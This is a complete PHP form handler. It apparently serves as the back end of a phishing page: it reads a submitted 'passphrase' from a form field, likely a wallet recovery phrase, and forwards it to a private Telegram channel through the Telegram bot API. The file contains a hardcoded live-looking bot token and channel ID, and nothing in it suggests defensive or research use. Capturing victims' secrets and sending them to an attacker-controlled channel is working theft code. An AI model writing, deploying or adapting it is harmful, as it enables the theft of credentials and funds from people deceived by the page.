<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $passphrase = trim($_POST['mf-text']);

    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    try {
        sendToTelegram($passphrase);
        echo "Passphrase sent successfully!";
    } catch (Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
} else {
    echo "Invalid request method.";
}

function sendToTelegram($passphrase) {
    // Telegram Bot API token
    $botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
    
    // Your private channel ID (with -100 prefix)
    $channelId = "6542433272";  // Replace with your actual channel ID

    // The message you want to send
    $message = $passphrase;

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Data to be sent
    $data = [
        'chat_id' => $channelId,
        'text' => $message
    ];

    // Use cURL to send the request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    // Close cURL session
    curl_close($ch);

    // Check response
    $responseData = json_decode($response, true);
    if (!$responseData || !$responseData['ok']) {
        throw new Exception("Failed to send message: " . ($responseData['description'] ?? 'Unknown error'));
    }
}
?>
